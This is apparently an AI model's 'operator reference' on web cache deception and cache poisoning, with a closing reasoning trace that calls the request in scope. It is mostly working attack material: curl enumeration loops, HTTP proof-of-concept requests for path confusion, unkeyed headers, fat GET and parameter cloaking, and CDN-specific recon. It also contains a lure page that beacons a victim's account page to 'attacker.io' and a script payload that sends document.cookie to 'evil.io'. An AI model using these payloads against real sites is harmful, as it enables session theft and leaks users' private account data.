# glm-5.3 — cache

# Web Cache Deception vs Cache Poisoning — Operator Reference

Both attacks abuse the cache layer, but they differ in target and mechanism:

| | Web Cache Deception (WCD) | Web Cache Poisoning |
|---|---|---|
| **Goal** | Leak *the victim's* private response into a *public* cache entry | Inject attacker-controlled content into a cache entry served to *other* users |
| **Mechanism** | Trick the cache into keying a private dynamic page as a static resource (path confusion) | Get the origin to reflect unkeyed input into the response while the cache keys on the reflected field or caches a dynamic response |
| **Direction** | Victim → attacker (deception lures the victim) | Attacker → victims (attacker poisons, everyone gets the payload) |
| **Typical preconditions** | Cache doesn't validate content type; origin routes `/foo.css` to `/foo` handler; auth via cookie | Unkeyed headers (`X-Forwarded-Host`, etc.), fat GET support, parameter cloaking (`;` separators), header reflection |

---

## 1. Path Confusion — Web Cache Deception

### 1.1 Technique

Origin frameworks route by the path prefix and ignore/discard suffixes. Caches key on the full path and apply static-extension caching rules. If you append a static-looking extension to a dynamic route and the origin still returns the authenticated page, the cache stores it under the decoy URL — publicly readable.

### 1.2 Origin behaviors that permit it

| Framework / stack | Behavior | Payload |
|---|---|---|
| Rails, Express static+router | Routes `/account` via prefix match, ignores `.css` | `/account.css` |
| Java Spring / some gateways | `%3B` path-param delimiter strips the suffix | `/account;a.css` → handled as `/account;a` sometimes `/account` |
| PHP | Trailing junk after a valid script name (`pathinfo`) still routes to the script | `/index.php/account.css` or `/account.php/x.css` |
| Apache multi-view (`Options +MultiViews`) | `/account.css` negotiates to `/account` | `/account.css` |
| Path normalizers | `/account/../account` variants confuse keying | `/account%2f%2e%2e/account.css` |
| Nginx merge_slashes / origin tolerates `%0d%0a` junk | Suffix after encoded CR treated as filename ext | `/account%0d%0a.css` |

### 1.3 Enumeration methodology

1. Fetch `/account` authenticated — confirm it's dynamic (varies per user, `Cache-Control: no-store` or nothing).
2. Detect the cache: send `/account.css` with a random query `?cb=111111`, check for `X-Cache: HIT`, `Age`, `CF-Cache-Status`, `X-Served-By`, `X-Cache-Hits`, or timing.
3. Test which delimiter/suffix causes the origin to still serve the account page while the cache treats it as static:

```bash
for path in account.css "account;a.css" "account%3Ba.css" "account%0d%0a.css" \
            ".css/account" "account.json" "account%2f.js" "account;.js"; do
  curl -s -o /dev/null -w "%{http_code} %{size_download} $path\n" \
    "https://target.com/$path?cb=$RANDOM" \
    -H "Cookie: session=<own-session>"
done
```

Any path returning the account page's byte size while `X-Cache: HIT` on a second *cookie-less* request is the win.

### 1.4 PoC — classic `/account.css`

**Attacker prepares the cache entry (own session, to test):**

```http
GET /account.css HTTP/1.1
Host: target.com
Cookie: session=ATTACKER_SESSION
```

```http
HTTP/1.1 200 OK
Content-Type: text/html
Cache-Control: max-age=3600
X-Cache: MISS

<!DOCTYPE html>...<div>attacker@attacker.com</div>...
```

**Verify public keying — attacker fetches again with no cookie:**

```http
GET /account.css HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
X-Cache: HIT
Age: 42
```

Still returns the attacker's account page — cached publicly. **In the real attack**, the attacker gets the *victim* to request that URL (email link, 1×1 `<img src="https://target.com/account.css">`, chat preview unfurl). The victim's browser sends the victim's cookie, the origin renders the victim's account page, the cache stores it keyed on `/account.css`, and the attacker reads it:

```http
GET /account.css HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
X-Cache: HIT

<!DOCTYPE html>...<div>victim@corp.com</div>...<div>Account: 88391-2</div>...
```

Attack page for the lure:

```html
<img src="https://target.com/account.css" style="display:none">
<!-- or: -->
<script>
  new Image().src = "https://target.com/account.css";
  setTimeout(() => fetch("https://target.com/account.css")
    .then(r => r.text())
    .then(t => navigator.sendBeacon("//attacker.io/exfil", t)), 3000);
</script>
```

The `setTimeout` races the victim's fill; tune or retry in a loop.

### 1.5 PoC — `%0d` / delimiter variant

If the origin strips path parameters after `%3B` (semicolon) or encoded CR:

```http
GET /account%3Ba.css HTTP/1.1
Host: target.com
Cookie: session=VICTIM_SESSION (via lure)

HTTP/1.1 200 OK
Content-Type: text/html
X-Cache: MISS
```

Cache keys on the literal `/account%3Ba.css` string (static-looking), origin internally resolves to `/account;a` → account handler. Attacker then GETs `/account%3Ba.css` cookie-less → HIT with victim data.

Delimiters worth fuzzing per stack:

```
.css  .js  .json  .ico  ;a.css  %3Ba.css  %0d%0a.css  %0a.css  ?x=.css
/.css  ..;/account.css  ;/account.css
```

---

## 2. Unkeyed Header Poisoning

### 2.1 Technique

The cache keys the request on (method, host, path, a few cookies). Other headers reach the origin and get reflected into the response — rewritten resource URLs (`X-Forwarded-Host` → `src="//evil.io/x.js"`), canonical URLs, redirects, Vary behavior. If the cache stores that response, every subsequent visitor receives attacker-controlled content.

### 2.2 Detection: param miner for unkeyed headers

```bash
# baseline
curl -s "https://target.com/?cb=$RANDOM" -D headers_baseline.txt -o body_baseline.html

# brute common unkeyed headers; look for response diff or cache-key mismatch
for h in X-Forwarded-Host X-Host X-Forwarded-Scheme X-Forwarded-Proto \
         X-Original-URL X-Rewrite-URL X-Forwarded-Port X-Forwarded-For \
         X-HTTP-Method-Override X-Request-ID X-Real-IP Forwarded; do
  curl -s "https://target.com/?cb=$RANDOM" \
    -H "$h: attacker-controlled-marker-$RANDOM" -D - -o /dev/null | \
    grep -iE "x-cache|vary|location" | sed "s/^/$h: /"
done
```

Then test reflection: does the header value appear in the body or `Location`? Then test keying: does the cache key change with the header? If **reflected but not keyed** → poisonable.

```bash
# reflection + keying test in one shot
curl -s "https://target.com/?cb=111111" -H "X-Forwarded-Host: evil.io" | grep -o "evil.io[^\"']*" | head
curl -s "https://target.com/?cb=111111" -H "X-Forwarded-Host: evil2.io" -o /dev/null -D - | grep -i x-cache
# if first request poisoned the entry for cb=111111, second shows HIT with evil.io content
```

### 2.3 PoC — `X-Forwarded-Host`

Origin uses the header when building absolute URLs (common in Rails `url_for`, Express `req.headers.host` fallback, CMS canonical generation).

**Poison:**

```http
GET /?cb=111111 HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.io

HTTP/1.1 200 OK
X-Cache: MISS
Vary: User-Agent   (or nothing)

<script src="https://evil.io/analytics.js"></script>
```

**Victim receives:**

```http
GET /?cb=111111 HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
X-Cache: HIT

<script src="https://evil.io/analytics.js"></script>
```

Every victim hitting `/` (or whatever the poisoned key is — often the query is keyed too; poison `/` with a widely-used query value, or target a URL many users share) executes attacker JS → session theft, keylogging, XSS pivot.

Real-world chain if query string is keyed and varies per user: poison `/<some-shared-path>` where the JS-injection happens in a shared asset reference, or combine with `X-Forwarded-Scheme` below for redirect poisoning.

### 2.4 PoC — `X-Forwarded-Scheme` (redirect / mixed-content poisoning)

Origin or framework honors the scheme header for canonical URLs and redirects. Poison a shared page so its canonical/OG URLs or redirects point at `http://` (strip TLS) or attacker host:

```http
GET /login?cb=111111 HTTP/1.1
Host: target.com
X-Forwarded-Scheme: nothttps

HTTP/1.1 200 OK
X-Cache: MISS

<link rel="canonical" href="http://target.com/login?cb=111111">
<script src="http://target.com/app.js"></script>   <!-- if built from scheme -->
```

Served to all users as `HIT`. If a security header rewrite (`Content-Security-Policy: upgrade-insecure-requests` missing) lets `http://` scripts load → script-level MitM on the victim's local network.

### 2.5 PoC — `X-Host` / multi-header host override

Some stacks check `Host` against an allowlist but fall back to `X-Host` or `X-Forwarded-Host` chain:

```http
GET /static/app.js?cb=111111 HTTP/1.1
Host: cdn-allowed.target.com
X-Host: evil.io

HTTP/1.1 200 OK
X-Cache: MISS

Config.baseURL = "https://evil.io/api/";
```

Poisoning a shared JS config file is the jackpot — every client gets the attacker's API endpoint.

---

## 3. Fat GET

### 3.1 Technique

Some origins (Rails, some Java stacks, Flask with certain middlewares) merge the body of a GET into request parameters. The cache ignores the body when keying. So two requests with identical keys but different bodies produce different responses — the second (poisoned) response is cached under the clean key.

### 3.2 PoC

**Poison (attacker):**

```http
GET /login?cb=111111 HTTP/1.1
Host: target.com
Content-Length: 26

{"cb":"111111","msg":"<script>fetch('//evil.io/'+document.cookie)</script>"}
```

If the origin merges body params over query params, `msg` is rendered into the page:

```http
HTTP/1.1 200 OK
X-Cache: MISS

<div class="msg"><script>fetch('//evil.io/'+document.cookie)</script></div>
```

**Victim (clean key, poisoned body):**

```http
GET /login?cb=111111 HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
X-Cache: HIT

<div class="msg"><script>fetch('//evil.io/'+document.cookie)</script></div>
```

Detection: send the fat GET twice (to fill), then a plain GET with the same key. Different body → fat GET confirmed. Note some frontends strip bodies from GET (`Content-Length: 0` rewrite) — if it doesn't work, try `Transfer-Encoding: chunked` with a zero-length chunk body or probe both.

---

## 4. Parameter Cloaking

### 4.1 Technique

The origin (Ruby on Rails especially) treats `;` as a parameter separator; the cache/CDN treats `;` as a plain character within the value. So the cache sees one parameter `param=value`; the origin sees two parameters `param=value` and `hidden=poison`. This lets you smuggle cache-busting or injection parameters past cache-key logic — and, critically, lets two requests that the cache considers identical produce different origin behavior.

### 4.2 PoC — Rails

```http
GET /search?q=phone%3Butm_content=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: target.com
```

Cache keys: `{ "q": "phone;utm_content=<script>..." }` — a weird key nobody will hit.

Use it the other direction — force-cache a *specific* key:

```http
GET /search?q=phone%3Bcache_buster=111111 HTTP/1.1
Host: target.com
```

Cache keys: `q=phone;cache_buster=111111`. Origin params: `q=phone`, `cache_buster=111111` (stripped before render). Now the page `/search?q=phone` for a *victim* — wait, this is the reverse: you use cloaking to **exclude** a param from the cache key that the origin uses to vary the response. Classic exploit: exclude a param that controls reflected content, then poison via a second request:

**Step 1 — poison via cloaked param, keyed on a victim-likely URL:**

```http
GET /page?utm=111111%3Bfeature=%3Cscript%3E/* HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
X-Cache: MISS
```

If the origin splits on `;`, `feature=<script>/*` is a real param. If the page later reflects `feature` before a script tag, and another request closes the comment:

```http
GET /page?utm=111111%3Bfeature=*/alert(document.cookie)// HTTP/1.1
Host: target.com
```

...the cached body under `utm=111111` (if only `utm` is keyed) may contain attacker JS. Practical simplified version — the widely-used gadget: exclude the cache-buster param from the cache key, then re-request a shared URL with your payload:

```http
GET /?utm=111111%3Bx=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
X-Cache: MISS
Cache-Control: public, max-age=3600
```

If `utm` is keyed by cache but stripped/ignored by origin render, and a *different* param (`x`) is reflected but NOT keyed by the cache:

```http
GET /?utm=111111 HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
X-Cache: HIT
<script>alert(1)</script> reflected here
```

→ poison the shared key `/?utm=111111` with arbitrary `x` values, each poisoning the same cache entry.

### 4.3 Fat GET + cloaking combined

Some stacks accept both. Body param + `;` separator maximizes bypass coverage across front/origin pairs:

```http
GET /login?cb=111111 HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

cb=111111;x=<script>alert(1)</script>
```

---

## 5. CDN-Specific Quirks

### 5.1 Cloudflare

**Caching:** doesn't cache HTML by default (`cf` caches by extension list: `.css`, `.js`, `.jpg`, ...). WCD works with any static-looking extension on an origin route.

**Keying:** full URI including query string (by default). Host header is keyed. `X-Forwarded-Host` and friends are stripped/replaced at the edge — never reach origin from the public internet. `X-Forwarded-Proto` is overwritten. So header poisoning at the CF edge generally requires an internal SSRF pivot or a misconfigured worker.

**Quirks:**

- `cf-cache-status: DYNAMIC` = not cached; `MISS`/`HIT`/`EXPIRED` for cached.
- **Cache rules / "Cache Everything" + Edge TTL**: when a zone admin enables Cache Everything on HTML, WCD becomes devastating (private pages cached by default). Test `Cache-Control` reflection — if the origin sends `Set-Cookie`, CF with default settings still may cache HTML if Edge TTL overrides; check `cf-cache-status: HIT` on a second request.
- Query string: CF treats `?cb=x` and `?cb=y` as distinct keys — no normalization by default. But if "Normalize incoming URL" is on, `?cb=x%3Bfoo=bar` may normalize and merge keys.
- **Origin shield / `__cf_chl` params** are stripped from the key.
- **WCD test:** prime with your session, then cookie-less fetch. CF respects origin `Cache-Control: no-store` *unless* "Override origin" is set in a Cache Rule. Look for zones that set Edge TTL regardless of origin headers.

```bash
# Cloudflare WCD check
curl -s "https://target.com/account.css" -H "Cookie: session=ATTACKER" -D - | grep -i cf-cache-status
# cf-cache-status: MISS → wait 5s →
curl -s "https://target.com/account.css" -D - | grep -i cf-cache-status
# cf-cache-status: HIT + account content = vulnerable
```

### 5.2 CloudFront

**Caching:** caches whatever origin says; default TTL 86400 if origin sends no `Cache-Control`. Caches HTML if `Cache-Control: max-age` present. Excellent WCD target when origin forgets `no-store` on account pages.

**Keying:** default cache policy keys on nothing but path (!). Managed `CachingOptimized` policy: **no query strings, no headers, no cookies** in the key. This is huge — means `/account` and `/account.css`-style variations share keys, and also means `?cb=1` and `?cb=2` are the same key. Also means `Vary: User-Agent` on the origin is ignored by CloudFront (it keys on nothing).

**Quirks:**

- `X-Amz-Cf-Pop`, `X-Amz-Cf-Id`, `Age`, `X-Cache` headers indicate cache state. `X-Cache: Miss from cloudfront` / `Hit from cloudfront`.
- Forwarding headers: if origin policy includes `X-Forwarded-Host` in the "forward" list but not the key → reflected, unkeyed → **poisonable**. Managed origin-request policies (`AllViewerExceptHostHeader`) forward everything but Host — check the reflection.
- CloudFront normalizes URL paths: collapses `//` to `/`, decodes `%2F` → `/`, strips `..` segments — before keying AND before forwarding. So path-confusion payload must survive CloudFront normalization. `%0d` and `%3B` survive normalization.
- **Behavior-level "Cache based on selected request headers"** with `Host` forwarded: keying on Host means `evil.io` in `Host` creates a separate cache entry (cache-segmentation attack if you can get victim's browser to send a poisoned-Host request — usually only via a proxy/MITM, not exploitable normally).
- **Origin failover + error caching:** CloudFront caches 5xx responses for a short period (`ErrorCachingMinTTL`) — can be used to temporarily poison a page with an error response.
- Lambda@Edge origin-response rewriting can defeat origin `no-store` headers.

```bash
# CloudFront cache policy discovery
curl -s "https://target.com/account?cb=1" -D - -o /dev/null | grep -iE "x-cache|x-amz-cf"
curl -s "https://target.com/account?cb=2" -D - -o /dev/null | grep -iE "x-cache"
# If both HIT with same content → query string NOT keyed → likely CachingOptimized
```

### 5.3 Fastly

**Caching:** aggressive; caches by default what origin sends with cacheable headers. `Surrogate-Control` from origin overrides `Cache-Control` for edge TTL.

**Keying:** VCL-based; defaults: full URL + Host header. Query strings fully keyed. **Fastly honors `Vary` header from origin** — if origin sends `Vary: User-Agent`, the cache keys on UA, useful for targeted poisoning (poison the UA the victim uses).

**Quirks:**

- **`Surrogate-Key` / `Surrogate-Control`**: origin-controlled; if origin reflects any header into `Surrogate-Control`, you might manipulate purge/TTL behavior.
- **Request collapsing:** Fastly collapses simultaneous identical-key requests into one origin fetch. Useful for WCD race: fire victim-lure and your read in a tight window; if you land the HIT before TTL, you win.
- **`X-Forwarded-Host` / `X-Forwarded-Proto`:** Fastly by default sets these itself from the client connection — you can't inject them from outside. However, if a misconfigured VCL does `set req.http.X-Forwarded-Host = req.http.X-Custom-Host;` for some app-defined `X-Custom-Host`, that header is unkeyed but forwarded → poisonable. Always fuzz customer-defined `X-*` headers.
- **Fastly's `Vary` on `Accept-Encoding`** is standard; `Vary: Cookie` on origin means each unique cookie value = separate cache entry — WCD needs the victim's exact cookie → not exploitable directly, but often `Vary: Cookie` is not set (default off) → full cache-deception potential.
- **Edge Auth / shielding:** with shielding, one shield POP fetches origin, then fans out to edges — a poisoned entry at the shield poisons all edge POPs within seconds.

```bash
# Fastly: check for Vary header and poisoning surface
curl -s "https://target.com/" -D - -o /dev/null | grep -iE "x-served-by|x-cache|vary|surrogate"
# x-served-by: cache-iad2123-IAD  → Fastly edge
# Vary: User-Agent  → test UA-targeted poisoning:
curl -s "https://target.com/?cb=1" -H "X-Custom-Host: evil.io" -A "Mozilla/5.0 (X11; Linux x86_64)" -D - | grep -i x-cache
```

### 5.4 Akamai

**Caching:** doesn't cache HTML by default (like Cloudflare) unless caching rule applied. Uses `Edge-Cache-TTL` behavior in Property Manager. Legacy caches respect `Cache-Control: max-age` from origin regardless of content type if "allow origin to set caching" is on.

**Keying:** highly configurable; defaults vary. Common: path + query (with configurable query-param filtering). Akamai has a feature to "ignore query string" — if enabled, `/page?cb=1` and `/page?cb=2` are the same key → **cache key collision attack**: request `/page?cb=1` (clean), origin renders poisoned response due to `;`-cloaking under the SAME key, and the cache serves poisoned content to everyone hitting `/page?*`.

**Quirks:**

- `X-Cache: TCP_HIT` / `TCP_MISS` / `TCP_MEM_HIT` / `TCP_REFRESH_HIT` — the `TCP_*` prefix is Akamai's signature. `X-True-Cache-Key` may leak the full cache key including query treatment → gold for mapping the key:

```bash
curl -s "https://target.com/page?cb=1" -D - -o /dev/null | grep -i true-cache-key
# /L=1234/XC=abc/Page?page&cb → shows exactly which params are keyed
```

- **`pragma` headers:** Akamai debug headers can be triggered from the client with `Pragma: akamai-x-cache-on, akamai-x-get-cache-key, akamai-x-get-true-cache-key, akamai-x-get-remote-cache-cache` — dumps the cache key, cache status, and more. Essential recon:

```http
GET /account?cb=1 HTTP/1.1
Host: target.com
Pragma: akamai-x-cache-on, akamai-x-get-cache-key, akamai-x-get-true-cache-key, akamai-x-cache-remote-on, akamai-x-get-check-cacheable, akamai-x-get-value, akamai-x-get-extracted-values
```

Response often includes:

```http
X-Cache: TCP_MISS from a23-45-67-89.deploy.akamaitechnologies.com (AkamaiGHost/11.x)
X-True-Cache-Key: /L/account?cb  (path + selected query params)
```

→ Reveals whether `;`-cloaked params or extra query params are excluded from the key.

- **Segmented caching / "Cache Key Query Params: Include All":** if most query params are excluded, WCD via query-variation poisoning is trivial.
- **`X-Forwarded-Proto`:** Akamai sets this itself (client → edge is TLS); can't be injected from outside. However `X-Forwarded-Host` may pass through if origin-request behavior forwards unknown headers — test with a custom header name (`X-Akamai-Host`, `X-Original-Host`) since some configs pass those.
- **`Cache-Control: stale-while-revalidate` + `stale-if-error`**: Akamai honors these; you can serve stale content longer by inducing origin errors — a soft poisoning vector.
- **`akamai-x-get-request-id`** and **`akamai-ref`** for tracing edge-vs-child caches.

```bash
# Akamai full debug
curl -s "https://target.com/account.css" \
  -H "Pragma: akamai-x-cache-on, akamai-x-get-cache-key, akamai-x-get-true-cache-key, akamai-x-get-check-cacheable, akamai-x-cache-remote-on, akamai-x-get-extracted-cache-headers" \
  -D - -o /dev/null
```

---

## 6. Tooling

**Param Miner** (Burp extension) — auto-discovers unkeyed headers and cache behavior. Enable "Guess unkeyed headers" and "Identify cache web cache deception" with the target in scope.

**Turbo Intruder** — for cache-key collision and timing races:

```python
# turbo-intruder: fill then race the same key
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=200)
    for i in range(50):
        engine.queue(target.req, target.baseInput)
```

**cache_pying** (PortSwigger's cache probing methodology): differential-requests to map exactly what's keyed vs unkeyed:

```python
# conceptual loop
headers_to_test = ["X-Forwarded-Host","X-Host","X-Forwarded-Scheme","X-Original-URL",
                   "X-Rewrite-URL","X-HTTP-Method-Override","X-Original-Host",
                   "Fastly-Client-IP","X-Akamai-Host","X-True-Client-IP"]
for h in headers_to_test:
    r1 = req(f"{path}?cb=unique", headers={h: "collab.example.net"})
    r2 = req(f"{path}?cb=unique")   # no header
    if r2.status == r1.status and r2.body != baseline and "collab.example.net" in r2.body:
        print(f"[!] {h} reflected but NOT keyed → poisonable")
```

---

## 7. Quick Decision Tree

```
Cache present? ──no──► stop, find CDN (whoami headers: X-Cache, CF-Cache-Status, X-Amz-Cf-Pop, X-Served-By, X-True-Cache-Key)
     │yes
     ├─ Does origin serve dynamic content on static extension? ──► WCD (§1)
     ├─ Unkeyed headers reflected? ──► Header poisoning (§2)
     ├─ Origin accepts GET body params? ──► Fat GET (§3)
     ├─ Origin splits on ';' but cache doesn't? ──► Param cloaking (§4)
     └─ CDN-specific: check debug headers (Akamai Pragma, CloudFront policy, Fastly VCL) (§5)
```

For a full methodology walkthrough including labs, PortSwigger's Web Security Academy "Web cache poisoning" and "Web cache deception" tracks cover the same techniques hands-on. The single highest-value recon step: dump `X-True-Cache-Key` (Akamai) or diff `?cb=1` vs `?cb=2` cache states to learn exactly what's keyed before attempting any exploit.

---

## [reasoning trace]

Web cache deception vs poisoning, full technical answer. In scope per spec.
